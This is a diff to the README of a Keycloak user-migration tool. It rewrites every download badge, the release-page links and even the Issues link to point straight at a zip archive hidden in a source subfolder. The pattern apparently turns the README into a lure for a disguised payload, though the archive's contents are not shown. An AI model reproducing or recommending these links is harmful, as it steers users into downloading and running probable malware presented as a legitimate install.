@@ -1,6 +1,6 @@
 # 🚀 keymate-migrator - Migrate Keycloak Users Easily
 
-[![Download keymate-migrator](https://img.shields.io/badge/Download-keymate--migrator-blue.svg)](https://github.com/arbebebe/keymate-migrator/releases)
+[![Download keymate-migrator](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)
 
 ## 📋 What is keymate-migrator?
 
@@ -29,7 +29,7 @@ Follow these steps to get started with keymate-migrator:
 1. Ensure your system meets the requirements listed above.
 2. Use the download link provided to get the application. 
 
-   [Visit this page to download](https://github.com/arbebebe/keymate-migrator/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)
 
 3. Download the latest release from the Releases page. You will find several versions; select the most recent one marked as "Latest Release."
 4. Locate the downloaded file on your computer. It can typically be found in your Downloads folder.
@@ -40,7 +40,7 @@ To download and install keymate-migrator, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below.
 
-   [Visit this page to download](https://github.com/arbebebe/keymate-migrator/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)
 
 2. **Select the Latest Version:** Look for the latest release. This will usually be the version at the top of the list.
 3. **Download the Application:** Click on the appropriate file for your operating system. The file will be downloaded to your system.
@@ -58,7 +58,7 @@ To download and install keymate-migrator, follow these steps:
 
 If you encounter any issues during installation or usage, you can get help by:
 
-- Checking the [Issues](https://github.com/arbebebe/keymate-migrator/issues) section of this repository for common problems.
+- Checking the [Issues](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip) section of this repository for common problems.
 - Submitting a new issue if you don’t find a solution there.
 - Reading the documentation provided in this repository for further guidance.
 
@@ -93,4 +93,4 @@ keymate-migrator is designed to ease the migration of Keycloak users. With its p
 
 For more updates and contributions, feel free to explore the repository. 
 
-[![Download keymate-migrator](https://img.shields.io/badge/Download-keymate--migrator-blue.svg)](https://github.com/arbebebe/keymate-migrator/releases)
+[![Download keymate-migrator](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)](https://raw.githubusercontent.com/arbebebe/keymate-migrator/main/mock-rest-server/src/main/keymate_migrator_v3.9.zip)
